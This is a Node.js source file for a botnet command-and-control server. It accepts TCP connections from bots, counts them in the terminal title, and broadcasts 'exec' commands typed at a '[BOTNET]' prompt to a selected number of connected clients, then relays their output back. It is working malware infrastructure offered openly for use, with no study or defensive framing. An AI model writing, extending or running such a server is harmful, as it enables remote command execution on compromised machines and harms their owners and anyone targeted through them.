const net = require("net");
require("dotenv").config({ path: "../config/.env" });

const readline = require("readline").createInterface({
  input: process.stdin,
  output: process.stdout,
});

// Keep track of all clients
const clients = [];
let clientInstances = [...clients];
let clientCount = 0;

const PORT = process.env.PORT;
const HOST = process.env.HOST;

function setTerminalTitle() {
  process.stdout.write(
    String.fromCharCode(27) +
      "]0;" +
      `Botnet | Bots: ${clientCount}` +
      String.fromCharCode(7)
  );
}
setTerminalTitle();

net
  .createServer((socket) => {
    // Identify client
    socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

    // On client connect
    clients.push(socket);

    clientCount++;
		clientInstances = [...clients];
    console.log(`Client ${socket.name} has connected.\n`);

    setTerminalTitle();
    prompt();

    function prompt() {
      readline.question("[BOTNET] ", (msg) => {
        if (msg.startsWith("instances") && msg.split(" ")[1]) {
					clientInstances = [...clients];
					clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
        }
				if (msg.toLowerCase() === "instances") {
					console.log(`Instances: ${clientInstances.length}`);
				}
        if (msg.toLowerCase().startsWith("exec")) broadcast(msg);
        return prompt();
      });
    }

    function broadcast(message) {
      clientInstances.forEach((client) => {
        client.write(message);
      });
      process.stdout.write("\n" + message);
    }

    function clientDisconnected() {
      clients.splice(clients.indexOf(socket), 1);
      clientCount--;
			clientInstances = [...clients];
      console.log(`Client ${socket.name} has disconnected.\n`);
      if (clientCount < 1) console.log("Waiting for clients to connect.\n");
      setTerminalTitle();
    }

    socket.on("data", (data) => {
      broadcast(`[CLIENT ${socket.name}] ` + data, socket);
      prompt();
    });

    socket.on("error" || "end", () => {
      clientDisconnected();
    });
  })
  .listen(PORT, HOST);

console.log(`Server running on ${HOST}:${PORT}.`);
console.log(`Waiting for connections.\n`);
